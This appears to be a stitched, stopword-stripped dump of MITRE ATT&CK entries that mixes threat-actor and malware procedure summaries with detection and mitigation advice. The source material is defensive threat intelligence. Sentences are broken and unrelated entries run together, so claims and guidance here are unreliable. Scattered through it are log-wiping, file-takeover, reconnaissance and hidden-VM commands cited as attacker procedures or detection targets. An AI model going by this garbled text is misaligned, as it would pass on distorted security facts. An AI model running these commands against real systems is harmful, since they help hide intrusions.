Kobalos Feb 2021)(Citation: ESET Kobalos Jan 2021)  [APT33](https://attack.mitre.org/groups/G0064) attempted exploit vulnerability WinRAR (CVE-2018-20250), attempted gain remote code execution security bypass vulnerability (CVE-2017-11774).(Citation: Symantec Elfin Mar 2019)(Citation: Holmium June 2020) Monitor Registry entries Winlogon correlate software, patch cycles, etc. Tools Sysinternals Autoruns detect attempts persistence, including listing current Winlogon helper values. (Citation: TechNet Autoruns) [Astaroth](https://attack.mitre.org/software/S0373) ActiveX objects file execution manipulation. (Citation: Cofense Astaroth Sept 2018) [MarkiRAT](https://attack.mitre.org/software/S0652) capture clipboard content.(Citation: Kaspersky Ferocious Kitten Jun 2021) (Citation: RSA2017 Detect Respond Adair) Monitor Registry entries password filters (ex: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages`) correlate investigate DLL files files reference. (Citation: Kaspersky Lyceum October 2021) [DarkComet](https://attack.mitre.org/software/S0334) gathers username victim’s machine.(Citation: TrendMicro DarkComet Sept 2014) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. Monitor execution arguments mavinject.exe. Compare invocations mavinject.exe prior history arguments injected DLLs determine anomalous adversarial activity. Collect analyze signing certificate metadata check signature validity software executes environment C2 server [XTunnel](https://attack.mitre.org/software/S0117) port victim fallback connection closes port.(Citation: ESET Sednit 2) [PLEAD](https://attack.mitre.org/software/S0435) ability list windows compromised host.(Citation: TrendMicro BlackTech June 2017)(Citation: TrendMicro BlackTech June 2017) [Cyclops Blink](https://attack.mitre.org/software/S0687) decrypt parse instructions C2.(Citation: NCSC Cyclops Blink February 2022) Monitor Registry edits modifications services startup programs correspond security tools. [Olympic Destroyer](https://attack.mitre.org/software/S0365) module credentials LSASS, [Mimikatz](https://attack.mitre.org/software/S0002). credentials [PsExec](https://attack.mitre.org/software/S0029) [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) malware propagate network.(Citation: Talos Olympic Destroyer 2018) [StrongPity](https://attack.mitre.org/software/S0491) signed self-signed certificates.(Citation: Bitdefender StrongPity June 2020) [Zebrocy](https://attack.mitre.org/software/S0251) scans automatically collects files extensions: .doc, .docx, ,.xls, .xlsx, .pdf, .pptx, .rar, .zip, .jpg, .jpeg, .bmp, .tiff, .kum, .tlg, .sbx, .cr, .hse, .hsf, .lhz.(Citation: ESET Zebrocy Nov 2018)(Citation: ESET Zebrocy 2019) [SodaMaster](https://attack.mitre.org/software/S0627) ability query Registry detect key specific VMware.(Citation: Securelist APT10 March 2021) [Lizar](https://attack.mitre.org/software/S0681) plugin designed list processes.(Citation: Threatpost Lizar 2021)(Citation: BiZone Lizar 2021) Monitor executed commands arguments actions command history, <code>Clear-History</code> Windows `clear logging` / `clear history` Network Device CLI AAA logs, disable writing command history, <code>history -c</code> bash/zsh, . [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors `net start` command initial reconnaissance.(Citation: Cybereason OperationCuckooBees 2022) [SideCopy](https://attack.mitre.org/groups/G1008) legitimate DLL file name, `Duser.dll` disguise malicious remote access tool.(Citation: MalwareBytes SideCopy Dec 2021) [Bankshot](https://attack.mitre.org/software/S0239) binds listens port 1058 traffic utilizing FakeTLS method.(Citation: US-CERT Bankshot Dec 2017) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [Squirrelwaffle](https://attack.mitre.org/software/S1030) contained hardcoded list IP addresses block belong sandboxes analysis platforms.(Citation: ZScaler Squirrelwaffle Sep 2021)(Citation: Netskope Squirrelwaffle Oct 2021) [Pysa](https://attack.mitre.org/software/S0583) brute force attempts central management console, Active Directory accounts.(Citation: CERT-FR PYSA April 2020) Ensure alerts Protected View enabled.(Citation: Protected View) [Magic Hound](https://attack.mitre.org/groups/G0059) exfiltrate ZIP file dump LSASS memory compromised machine.(Citation: DFIR Report APT35 ProxyShell March 2022) Preventing users deleting writing files adversaries maliciously altering <code>~/.bash_history</code> files. [WastedLocker](https://attack.mitre.org/software/S0612) command ownership file reset ACL permissions <code>takeown.exe /F filepath</code> command.(Citation: NCC WastedLocker June 2020)  [Dyre](https://attack.mitre.org/software/S0024) registers service adding Registry keys.(Citation: Symantec Dyre June 2015) [Rancor](https://attack.mitre.org/groups/G0075) cmd.exe execute commmands.(Citation: Rancor Unit42 June 2018) [ShadowPad](https://attack.mitre.org/software/S0596) DGA based day month C2 servers.(Citation: Securelist ShadowPad Aug 2017)(Citation: Kaspersky ShadowPad Aug 2017)(Citation: FireEye APT41 Aug 2019) [Bisonal](https://attack.mitre.org/software/S0268) renamed malicious code `msacm32.dll` hide legitimate library; earlier versions disguised `winhelp`.(Citation: Talos Bisonal Mar 2020)  [Xbash](https://attack.mitre.org/software/S0341) list weak passwords C2 server brute forcing attempt brute force services ports.(Citation: Unit42 Xbash Sept 2018)(Citation: Trend Micro Xbash Sept 2018) (Citation: FireEye APT38 Oct 2018) [ZLib](https://attack.mitre.org/software/S0086) data files compromised host C2 servers.(Citation: Cylance Dust Storm) (Citation: FireEye FIN6 Apr 2019) [LoJax](https://attack.mitre.org/software/S0397) UEFI BIOS rootkit deployed persist remote access software targeted systems.(Citation: ESET LoJax Sept 2018) released optional patch update - KB3045645 - remove "auto-elevate" flag sdbinst.exe. prevent application shimming bypass UAC. [C0015](https://attack.mitre.org/campaigns/C0015), threat actors variety tools, including [AdFind](https://attack.mitre.org/software/S0552),  AnyDesk, Process Hacker.(Citation: DFIR Conti Bazar Nov 2021) [Emotet](https://attack.mitre.org/software/S0367) observed leveraging module scrapes email data Outlook.(Citation: CIS Emotet Dec 2018) [BLINDINGCAN](https://attack.mitre.org/software/S0520) AES XOR decrypt DLLs.(Citation: US-CERT BLINDINGCAN Aug 2020) [TajMahal](https://attack.mitre.org/software/S0467) ability steal documents local including print spooler queue.(Citation: Kaspersky TajMahal April 2019) Monitor newly constructed network connections Fast Flux DNS hide command control channel array rapidly changing IP addresses linked single domain resolution. [MuddyWater](https://attack.mitre.org/groups/G0069) malware leveraged rundll32.exe Registry key execute .dll.(Citation: Securelist MuddyWater Oct 2018) [Bazar](https://attack.mitre.org/software/S0534) inject target process including Svchost, Explorer, cmd process hollowing.(Citation: Cybereason Bazar July 2020)(Citation: NCC Team9 June 2020) [APT39](https://attack.mitre.org/groups/G0087) stolen credentials compromise Outlook Access (OWA).(Citation: FireEye APT39 Jan 2019) [APT28](https://attack.mitre.org/groups/G0007) installed Delphi backdoor custom algorithm C2 communications.(Citation: ESET Zebrocy 2019) [jRAT](https://attack.mitre.org/software/S0283) capability screenshots victim’s machine.(Citation: jRAT Symantec Aug 2018)(Citation: Kaspersky Adwind Feb 2016) [Maze](https://attack.mitre.org/software/S0449) attempted delete shadow volumes infected machines, encryption process.(Citation: McAfee Maze March 2020)(Citation: Sophos Maze VM September 2020) [QakBot](https://attack.mitre.org/software/S0650) Rundll32.exe enable C2 communication.(Citation: Crowdstrike Qakbot October 2020)(Citation: Red Canary Qbot)(Citation: Cyberint Qakbot 2021)(Citation: ATT QakBot April 2021) domain user local administrator multiple systems. [Evilnum](https://attack.mitre.org/groups/G0120) malicious JavaScript files victim's machine.(Citation: ESET EvilNum July 2020) [APT1](https://attack.mitre.org/groups/G0006) Windows command execute commands, batch scripting automate execution.(Citation: Mandiant APT1) [Bazar](https://attack.mitre.org/software/S0534) APIs allocate memory facilitate code execution/injection.(Citation: Cybereason Bazar July 2020) [Windshift](https://attack.mitre.org/groups/G0112) malware identify compromised host.(Citation: BlackBerry Bahamut) [ThiefQuest](https://attack.mitre.org/software/S0595) download execute payloads in-memory disk.(Citation: wardle evilquest partii) [BUBBLEWRAP](https://attack.mitre.org/software/S0043) collects information, including operating version hostname.(Citation: FireEye admin@338) [POWRUNER](https://attack.mitre.org/software/S0184) persists scheduled task executes minute.(Citation: FireEye APT34 Dec 2017) [Ixeshe](https://attack.mitre.org/software/S0015) registry values file names Adobe software, AcroRd32.exe.(Citation: Trend Micro IXESHE 2012) [LAPSUS$](https://attack.mitre.org/groups/G1004) created virtual machines target's cloud environment leveraging credential access cloud assets.(Citation: MSTIC DEV-0537 Mar 2022)  [Remsec](https://attack.mitre.org/software/S0125) plugin detect active drivers security products.(Citation: Kaspersky ProjectSauron Technical Analysis) [Emissary](https://attack.mitre.org/software/S0082) capable configuring service.(Citation: Emissary Trojan Feb 2016) [FatDuke](https://attack.mitre.org/software/S0512) enumerate directories target machines.(Citation: ESET Dukes October 2019) [GALLIUM](https://attack.mitre.org/groups/G0093) modified version [NBTscan](https://attack.mitre.org/software/S0590) identify NetBIOS servers network <code>ping</code> identify remote systems.(Citation: Cybereason Soft Cell June 2019) services aid tracking newly acquired infrastructure, WHOIS databases domain registration information. Detection efforts focused stages adversary lifecycle, Command Control. [Ragnar Locker](https://attack.mitre.org/software/S0481) attempt connect removable drives mapped network drives.(Citation: Sophos Ragnar 2020) [APT32](https://attack.mitre.org/groups/G0050) attempted lure users execute malicious dropper delivered spearphishing attachment.(Citation: ESET OceanLotus)(Citation: Cybereason Oceanlotus 2017)(Citation: ESET OceanLotus Mar 2019)(Citation: FireEye APT32 April 2020)(Citation: Amnesty Intl. Ocean Lotus February 2021) [Grandoreiro](https://attack.mitre.org/software/S0531) spread malicious links embedded e-mails.(Citation: IBM Grandoreiro April 2020)(Citation: ESET Grandoreiro April 2020) [Sandworm Team](https://attack.mitre.org/groups/G0034) pushed additional malicious tools infected steal user credentials, laterally, destroy data.(Citation: ESET Telebots Dec 2016)(Citation: District Court Indictment GRU Unit 74455 October 2020) Monitor newly constructed files written extensions headers compressed encrypted file types. Detection efforts focus follow-on exfiltration activity, compressed encrypted files detected transit network intrusion detection data loss prevention analyzing file headers. [WellMail](https://attack.mitre.org/software/S0515) hard coded client certificate authority certificates communicate C2 mutual TLS.(Citation: CISA WellMail July 2020)(Citation: NCSC APT29 July 2020) [Revenge RAT](https://attack.mitre.org/software/S0379) schedules tasks malicious scripts intervals.(Citation: Cofense RevengeRAT Feb 2019) [QakBot](https://attack.mitre.org/software/S0650) proxy module encapsulate SOCKS5 protocol proxy protocol.(Citation: Kaspersky QakBot September 2021) [T9000](https://attack.mitre.org/software/S0098) searches connected drives removable storage devices.(Citation: Palo Alto T9000 Feb 2016) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors collected data, files, compromised networks.(Citation: Cybereason OperationCuckooBees 2022) [Misdat](https://attack.mitre.org/software/S0083) samples programmed Borland Delphi, mangle default compile timestamp file.(Citation: Cylance Dust Storm) [RCSession](https://attack.mitre.org/software/S0662) file named English.rtf benign victim hosts.(Citation: Secureworks BRONZE PRESIDENT December 2019)(Citation: Trend Micro DRBControl February 2020) [Dark Caracal](https://attack.mitre.org/groups/G0070) collected complete contents 'Pictures' folder compromised Windows systems.(Citation: Lookout Dark Caracal Jan 2018) [Ke3chang](https://attack.mitre.org/groups/G0004) performs local network connection discovery <code>netstat</code>.(Citation: Mandiant Operation Ke3chang November 2014)(Citation: NCC APT15 Alive Strong) Apply extended ACLs block unauthorized protocols trusted network.(Citation: US-CERT TA17-156A SNMP Abuse 2017) Monitor attempts user gain access network computing resource, providing credentials remote terminal services, entry command history file. Windows 8.1 Server 2012 R2, enable LSA Protection setting Registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL</code> <code>dword:00000001</code>. (Citation: LSA Protection Mar 2014) LSA Protection ensures LSA plug-ins drivers loaded digitally signed signature adhere Security Development Lifecycle (SDL) process guidance. Command-line invocation tools capable modifying services unusual, depending systems typically environment. abnormal process trees services execution commands relate Discovery adversary techniques. (Citation: ATT Sidewinder January 2021) [CaddyWiper](https://attack.mitre.org/software/S0693) ability dynamically resolve APIs, including `SeTakeOwnershipPrivilege`.(Citation: Cisco CaddyWiper March 2022) Monitor execution AppleScript <code>osascript</code> usage <code>NSAppleScript</code> <code>OSAScript</code> APIs suspicious behavior occurring system. [Empire](https://attack.mitre.org/software/S0363) utilize built-in modules modify service binaries restore original state.(Citation: Github PowerShell Empire) [Kimsuky](https://attack.mitre.org/groups/G0094) FTP download additional malware target machine.(Citation: VirusBulletin Kimsuky October 2019) [Mustang Panda](https://attack.mitre.org/groups/G0129) DropBox URLs deliver variants [PlugX](https://attack.mitre.org/software/S0013).(Citation: Proofpoint TA416 Europe March 2022) [Metamorfo](https://attack.mitre.org/software/S0455) performed process checks monitored applications.(Citation: Medium Metamorfo Apr 2020)  [Lucifer](https://attack.mitre.org/software/S0532) scan ports including TCP ports 135 1433.(Citation: Unit 42 Lucifer June 2020) [Conti](https://attack.mitre.org/software/S0575) enumerate processes search string “sql” process name.(Citation: CarbonBlack Conti July 2020) periodic review accounts privileges critical sensitive repositories. [OilRig](https://attack.mitre.org/groups/G0049) macros verify mouse connected compromised machine.(Citation: Check APT34 April 2021) Monitor files indicators deleting altering malicious network configuration settings generated artifacts host highlight network connection history, <code>Default.rdp</code> <code>/var/log/</code>.  [Grandoreiro](https://attack.mitre.org/software/S0531) steal cookie data credentials Google Chrome.(Citation: IBM Grandoreiro April 2020)(Citation: ESET Grandoreiro April 2020) [VERMIN](https://attack.mitre.org/software/S0257) collects OS name, machine name, architecture information.(Citation: Unit 42 VERMIN Jan 2018) Collecting comparing disk resource filenames binaries InternalName, OriginalFilename, ProductName match expected provide leads, indicative malicious activity. [Wizard Spider](https://attack.mitre.org/groups/G0102) “net view” command locate mapped network shares.(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020) [FELIXROOT](https://attack.mitre.org/software/S0267) adds shortcut file startup folder persistence.(Citation: ESET GreyEnergy Oct 2018) [QakBot](https://attack.mitre.org/software/S0650) collected usernames passwords Firefox Chrome.(Citation: Kaspersky QakBot September 2021) [NETWIRE](https://attack.mitre.org/software/S0198) TCP C2 communications.(Citation: Red Canary NETWIRE January 2020)(Citation: Unit 42 NETWIRE April 2020) Monitor newly constructed user accounts account audits detect suspicious accounts created adversary. Collect data account creation network Windows Event 4720 (for user account created Windows domain controller). [Ursnif](https://attack.mitre.org/software/S0386) injected codes banking sites steal sensitive online banking (ex: usernames passwords).(Citation: TrendMicro BKDR_URSNIF.SM) [Gazer](https://attack.mitre.org/software/S0168) establish persistence creating scheduled task.(Citation: ESET Gazer Aug 2017)(Citation: Securelist WhiteBear Aug 2017) domain administrator accounts day-to-day operations expose potential adversaries unprivileged systems. [KONNI](https://attack.mitre.org/software/S0356) executed malicious JavaScript code.(Citation: Malwarebytes Konni Aug 2021)  [InvisiMole](https://attack.mitre.org/software/S0260) list running processes.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) Modify Registry settings (directly Dcomcnfg.exe) `HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AppID\{{AppID_GUID}}` process-wide security individual applications.(Citation: Process Wide Keys)

Modify Registry settings (directly Dcomcnfg.exe) `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole` system-wide security defaults applications set process-wide security.(Citation: Wide Keys) (Citation: ACL) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors malicious HTA file contained mix encoded JavaScript/VBScript code.(Citation: DFIR Conti Bazar Nov 2021) [RemoteUtilities](https://attack.mitre.org/software/S0592) screenshots compromised host.(Citation: Trend Micro Muddy Water March 2021) (Citation: FireEye Periscope March 2018)(Citation: CISA AA21-200A APT40 July 2021)(Citation: Accenture MUDCARP March 2019) [Pupy](https://attack.mitre.org/software/S0192) built-in utility command <code>netstat</code>, session PowerView, interactive discover additional information.(Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) Lazagne harvesting credentials.(Citation: GitHub Pupy) [Attor](https://attack.mitre.org/software/S0438)'s plugin capable recording audio input sound devices.(Citation: ESET Attor Oct 2019) tools restrict program execution application control attributes file common operating utilities needed. [Kimsuky](https://attack.mitre.org/groups/G0094) gathered credentials [Mimikatz](https://attack.mitre.org/software/S0002) ProcDump.(Citation: CISA AA20-301A Kimsuky)(Citation: Netscout Stolen Pencil Dec 2018)(Citation: KISA Operation Muzabi) [Socksbot](https://attack.mitre.org/software/S0273) list running processes.(Citation: TrendMicro Patchwork Dec 2017) [RainyDay](https://attack.mitre.org/software/S0629) side-loading malicious executables.(Citation: Bitdefender Naikon April 2021) [Uroburos](https://attack.mitre.org/software/S0022) rootkit [Turla](https://attack.mitre.org/groups/G0010).(Citation: Kaspersky Turla) [Milan](https://attack.mitre.org/software/S1015) executable named `companycatalog.exe.config` benign.(Citation: ClearSky Siamesekitten August 2021) [Gamaredon Group](https://attack.mitre.org/groups/G0047) incorporated dynamic DNS domains infrastructure.(Citation: Unit 42 Gamaredon February 2022) Employ heuristic-based malware detection. Ensure updated virus definitions create custom signatures observed malware. "ZR" variant [BACKSPACE](https://attack.mitre.org/software/S0031) check host-based firewalls installed infected systems. [BACKSPACE](https://attack.mitre.org/software/S0031) attempt establish C2 channel, examine windows identify pop-up firewall software simulate mouse-click connection proceed.(Citation: FireEye APT30) [ZxShell](https://attack.mitre.org/software/S0412) leverage native API including <code>RegisterServiceCtrlHandler </code> register service.RegisterServiceCtrlHandler  [jRAT](https://attack.mitre.org/software/S0283) list network connections.(Citation: Kaspersky Adwind Feb 2016) difficult adversaries advance operation exploitation undiscovered unpatched vulnerabilities sandboxing. types virtualization application microsegmentation mitigate impact types exploitation. Risks additional exploits weaknesses systems exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape) [FunnyDream](https://attack.mitre.org/software/S1044) identify processes Bkav antivirus.(Citation: Bitdefender FunnyDream Campaign November 2020) [admin@338](https://attack.mitre.org/groups/G0018) actors commands exploiting machine [LOWBALL](https://attack.mitre.org/software/S0042) malware OS: <code>ver >> %temp%\download</code> <code>systeminfo >> %temp%\download</code>(Citation: FireEye admin@338) BITS runs service status checked query utility (<code>sc query bits</code>).(Citation: Issues BITS July 2011) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) created forged Kerberos Ticket Granting Ticket (TGT) Ticket Granting Service (TGS) tickets maintain administrative access.(Citation: Secureworks BRONZE BUTLER Oct 2017) [STARWHALE](https://attack.mitre.org/software/S1037) collect data infected local host.(Citation: DHS CISA AA22-055A MuddyWater February 2022) Ensure MFA MFA policies requirements properly implemented existing deactivated dormant accounts devices. possible, configuring MFA solutions "fail closed" grant access errors. [Ramsay](https://attack.mitre.org/software/S0458) <code>netstat</code> enumerate network connections.(Citation: Antiy CERT Ramsay April 2020) [Emotet](https://attack.mitre.org/software/S0367) observed creating services maintain persistence. (Citation: US-CERT Emotet Jul 2018)(Citation: Secureworks Emotet Nov 2018)  [The White Company](https://attack.mitre.org/groups/G0089) phishing lure documents trick users infecting computers.(Citation: Cylance Shaheen Nov 2018) Monitor newly constructed files installed extensions maintain plist file /Library/Managed Preferences/username/ directory. Ensure listed files alignment approved extensions (Citation: Trend Micro Tick November 2019) Monitor files abuse Office templates persistence compromised system. Modification base templates, Normal.dotm, investigated base templates VBA macros. Office macro security settings investigated Restrict software installation trusted repositories cautious orphaned software packages. [Chaes](https://attack.mitre.org/software/S0631) decrypted AES encrypted binary file trigger download files.(Citation: Cybereason Chaes Nov 2020)  Monitor analyze application programming interface (API) calls indicative Registry edits <code>RegCreateKeyEx</code> <code>RegSetValueEx</code>. (Citation: Elastic Process Injection July 2017) [PLAINTEE](https://attack.mitre.org/software/S0254) cmd.exe execute commands victim’s machine.(Citation: Rancor Unit42 June 2018) (Citation: PLATINUM April 2016) [Bandook](https://attack.mitre.org/software/S0234) decoded PowerShell script.(Citation: CheckPoint Bandook Nov 2020) [NOKKI](https://attack.mitre.org/software/S0353) FTP C2 communications.(Citation: Unit 42 NOKKI Sept 2018) Monitor creation/modification Registry Windows logon scrips, nameley <code>HKCU\Environment\UserInitMprLogonScript</code>. [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors dynamic DNS services C2.(Citation: McAfee Night Dragon) [Rancor](https://attack.mitre.org/groups/G0075) attached malicious document email gain initial access.(Citation: Rancor Unit42 June 2018) [BackConfig](https://attack.mitre.org/software/S0475) hidden malicious payloads <code>%USERPROFILE%\Adobe\Driver\dwg\</code> mimicked legitimate DHCP service binary.(Citation: Unit 42 BackConfig 2020) [UBoatRAT](https://attack.mitre.org/software/S0333) upload download files victim’s machine.(Citation: PaloAlto UBoatRAT Nov 2017) [Shamoon](https://attack.mitre.org/software/S0140) change modified time files evade forensic detection.(Citation: McAfee Shamoon December 2018)	 [SideCopy](https://attack.mitre.org/groups/G1008) utilized `mshta.exe` execute malicious hta file.(Citation: MalwareBytes SideCopy Dec 2021) [Dacls](https://attack.mitre.org/software/S0497) Mach-O binary disguised .nib file.(Citation: SentinelOne Lazarus macOS July 2020) [BISCUIT](https://attack.mitre.org/software/S0017) command gather username system.(Citation: Mandiant APT1 Appendix) [FunnyDream](https://attack.mitre.org/software/S1044) `cmd.exe` execution remote hosts.(Citation: Bitdefender FunnyDream Campaign November 2020) [ShimRat](https://attack.mitre.org/software/S0444) list directories.(Citation: FOX-IT 2016 Mofang) [Diavol](https://attack.mitre.org/software/S0659) delete shadow copies `IVssBackupComponents` object `DeleteSnapshots` method.(Citation: Fortinet Diavol July 2021) [CARROTBAT](https://attack.mitre.org/software/S0462) ability delete downloaded files compromised host.(Citation: Unit 42 CARROTBAT November 2018) [Ixeshe](https://attack.mitre.org/software/S0015) capable executing commands [cmd](https://attack.mitre.org/software/S0106).(Citation: Trend Micro IXESHE 2012) [AppleSeed](https://attack.mitre.org/software/S0622) pull timestamp victim's machine.(Citation: Malwarebytes Kimsuky June 2021) (Citation: Talos TinyTurla September 2021) [SoreFang](https://attack.mitre.org/software/S0516) decode decrypt exfiltrated data C2.(Citation: CISA SoreFang July 2016) [jRAT](https://attack.mitre.org/software/S0283)’s Java payload encrypted AES.(Citation: jRAT Symantec Aug 2018) Additionally, backdoor files encrypted DES stream cipher. variants [jRAT](https://attack.mitre.org/software/S0283) incorporated AV evasion methods Java bytecode obfuscation commercial Allatori obfuscation tool.(Citation: Symantec Frutas Feb 2013) [XAgentOSX](https://attack.mitre.org/software/S0161) getInstalledAPP function <code>ls -la /Applications</code> gather applications installed.(Citation: XAgentOSX 2017) [NanHaiShu](https://attack.mitre.org/software/S0228) gather victim serial number.(Citation: Proofpoint Leviathan Oct 2017) [Remsec](https://attack.mitre.org/software/S0125) capable DNS C2.(Citation: Symantec Remsec IOCs)(Citation: Kaspersky ProjectSauron Report)(Citation: Kaspersky ProjectSauron Technical Analysis) Ensure proper file permissions set harden prevent root privilege escalation opportunities. [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) RC4 encryption (for Datper malware) AES (for xxmm malware) obfuscate traffic. [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) tool called RarStar encodes data custom XOR algorithm posting C2 server.(Citation: Secureworks BRONZE BUTLER Oct 2017) Monitor executed commands arguments leverage Office-based applications persistence startups. released PowerShell script safely gather mail forwarding rules custom forms mail environment steps interpret output.(Citation: Detect Outlook Forms) SensePost, tool [Ruler](https://attack.mitre.org/software/S0358) carry malicious rules, forms, attacks, released tool detect Ruler usage.(Citation: SensePost NotRuler) Monitor newly executed processes DCOM activity, invoked user logged on. Enumeration objects, [Query Registry](https://attack.mitre.org/techniques/T1012) [PowerShell](https://attack.mitre.org/techniques/T1059/001), precede malicious use.(Citation: Fireeye Hunting June 2019)(Citation: Enigma MMC20 Jan 2017) [WindTail](https://attack.mitre.org/software/S0466) instruct OS execute application dock icon menu.(Citation: objective-see windtail1 dec 2018) [PipeMon](https://attack.mitre.org/software/S0501), installer, tools signed stolen code-signing certificates.(Citation: ESET PipeMon 2020) [RedLeaves](https://attack.mitre.org/software/S0153) non-standard ports, 995, C2.(Citation: PWC Cloud Hopper Technical Annex April 2017) file access controls protect folders C:\Windows\System32. [LAPSUS$](https://attack.mitre.org/groups/G1004) compromised credentials access cloud assets target organization.(Citation: MSTIC DEV-0537 Mar 2022) Monitoring specific plist files reopening applications application registered reopened. [BBSRAT](https://attack.mitre.org/software/S0127) loaded msiexec.exe process hollowing hide execution.(Citation: Palo Alto Networks BBSRAT) [Astaroth](https://attack.mitre.org/software/S0373) DGA C2 communications.(Citation: Cybereason Astaroth Feb 2019) [HAWKBALL](https://attack.mitre.org/software/S0391) leveraged Windows API calls create processes, gather disk information, detect debugger activity.(Citation: FireEye HAWKBALL Jun 2019) [QakBot](https://attack.mitre.org/software/S0650) encrypt pack malicious payloads.(Citation: Cyberint Qakbot 2021) Configuration management databases (CMDB) asset management systems detection systems network devices exist network. Monitor logs unexpected actions delegated administrator accounts.(Citation: Nobelium Admin Privileges) [APT28](https://attack.mitre.org/groups/G0007) stored captured credential file named pi.log.(Citation: SIR 19) (Citation: Netscout Stolen Pencil Dec 2018)(Citation: KISA Operation Muzabi) [SILENTTRINITY](https://attack.mitre.org/software/S0692) gather list logged users.(Citation: GitHub SILENTTRINITY Modules July 2019)  [RCSession](https://attack.mitre.org/software/S0662) write configuration file Registry.(Citation: Trend Micro DRBControl February 2020)(Citation: Profero APT27 December 2020) [PUNCHBUGGY](https://attack.mitre.org/software/S0196) gather names.(Citation: Morphisec ShellTea June 2019)	 [FunnyDream](https://attack.mitre.org/campaigns/C0007), threat actors modified version source [PcShare](https://attack.mitre.org/software/S1050) remote administration tool.(Citation: Bitdefender FunnyDream Campaign November 2020) [Clambling](https://attack.mitre.org/software/S0660) collect compromised host.(Citation: Trend Micro DRBControl February 2020) [Dark Caracal](https://attack.mitre.org/groups/G0070) screenshots Windows malware.(Citation: Lookout Dark Caracal Jan 2018) Monitor newly constructed files unusual accounts normal administration duties (Citation: Trend Micro Iron Tiger April 2021) suspicious account behavior systems share accounts, user, admin, service accounts. Examples: account logged multiple systems simultaneously; multiple accounts logged machine simultaneously; accounts logged odd times business hours. Activity interactive login sessions process ownership accounts execute binaries remote account. (Citation: CISA AA21-200A APT40 July 2021) [OopsIE](https://attack.mitre.org/software/S0264) Confuser protector obfuscate embedded .Net Framework assembly C2. [OopsIE](https://attack.mitre.org/software/S0264) encodes collected data hexadecimal format writing files disk obfuscates strings.(Citation: Unit 42 OopsIE! Feb 2018)(Citation: Unit 42 OilRig Sept 2018) (Citation: Cybereason Valak 2020)(Citation: Unit 42 Valak July 2020)(Citation: Unit 42 TA551 Jan 2021)(Citation: Secureworks GOLD CABIN) [TrailBlazer](https://attack.mitre.org/software/S0682) filenames match compromised attempt avoid detection.(Citation: CrowdStrike StellarParticle January 2022) [Confucius](https://attack.mitre.org/groups/G0142) created scheduled tasks maintain persistence compromised host.(Citation: TrendMicro Confucius APT Aug 2021) [Hi-Zor](https://attack.mitre.org/software/S0087) executes regsvr32.exe called [Registry / Startup Folder](https://attack.mitre.org/techniques/T1547/001) persistence mechanism.(Citation: Fidelis INOCNATION) Monitor compressed/archive image files downloaded Internet contents tagged MOTW. Data events viewed isolation, chain behavior lead activities. [DarkWatchman](https://attack.mitre.org/software/S0673) collect OS version, architecture, uptime, name.(Citation: Prevailion DarkWatchman 2021) [PHOREAL](https://attack.mitre.org/software/S0158) capable creating reverse shell.(Citation: FireEye APT32 2017) [VaporRage](https://attack.mitre.org/software/S0636) download shellcode compromised websites.(Citation: MSTIC Nobelium Toolset 2021) [WellMail](https://attack.mitre.org/software/S0515) exfiltrate files victim machine.(Citation: CISA WellMail July 2020) monitoring commands arguments atypical benign virtualization software. Usage virtualization binaries command-line arguments running silent installation suspect (ex. <code>-silent</code>, <code>-ignore-reboot</code>), running headless (in background UI) virtual instance (ex. <code>VBoxManage startvm $VM --type headless</code>).(Citation: Shadowbunny VM Defense Evasion) Similarly, monitoring command arguments suppress notifications highlight malicious activity (ex. <code>VBoxManage.exe setextradata global GUI/SuppressMessages "all"</code>). Monitor commands enable hypervisors Hyper-V. [RainyDay](https://attack.mitre.org/software/S0629) file exfiltration tool collect changed files compromised host.(Citation: Bitdefender Naikon April 2021) [SUNBURST](https://attack.mitre.org/software/S0559) communicated POST requests party servers C2.(Citation: FireEye SUNBURST Backdoor December 2020) Monitor third-party application logging, messaging, artifacts leverage Confluence repositories valuable information. Watch access Confluence repositories performed privileged users (for example, Active Directory Domain, Enterprise, Schema Administrators) types accounts access repositories. capability exists, monitor alert users retrieving viewing documents pages; behavior indicative programmatic retrieve data repository. environments high-maturity, leverage User-Behavioral Analytics (UBA) platforms detect alert user based anomalies. [Fox Kitten](https://attack.mitre.org/groups/G0117) PowerShell scripts access credential data.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [Reaver](https://attack.mitre.org/software/S0172) installs service.(Citation: Palo Alto Reaver Nov 2017) [PipeMon](https://attack.mitre.org/software/S0501) switch alternate C2 domain reached.(Citation: ESET PipeMon 2020) Configure settings scheduled tasks force tasks context authenticated account allowing SYSTEM. Registry key located HKLM\SYSTEM\CurrentControlSet\Control\Lsa\SubmitControl. setting configured GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: server operators schedule tasks, set disabled. (Citation: TechNet Server Operator Scheduled Task) [HEXANE](https://attack.mitre.org/groups/G1001) identified executives, HR, staff victim organizations targeting.(Citation: SecureWorks August 2019)(Citation: ClearSky Siamesekitten August 2021) [GrimAgent](https://attack.mitre.org/software/S0632) Rotate (RoR) Rotate Left (RoL) functionality encrypt strings.(Citation: IB GrimAgent July 2021) [UACMe](https://attack.mitre.org/software/S0116) methods bypassing Windows User Account Control multiple versions operating system.(Citation: Github UACMe) verification distributed binaries hash checking integrity checking mechanisms. Scan downloads malicious signatures attempt software updates prior deployment note potential suspicious activity. [Unknown Logger](https://attack.mitre.org/software/S0130) capable recording keystrokes.(Citation: Forcepoint Monsoon) (Citation: FireEye FIN7 Oct 2019) [IndigoZebra](https://attack.mitre.org/groups/G0136) spearphishing emails malicious attachments urged recipients review modifications file trigger attack.(Citation: HackerNews IndigoZebra 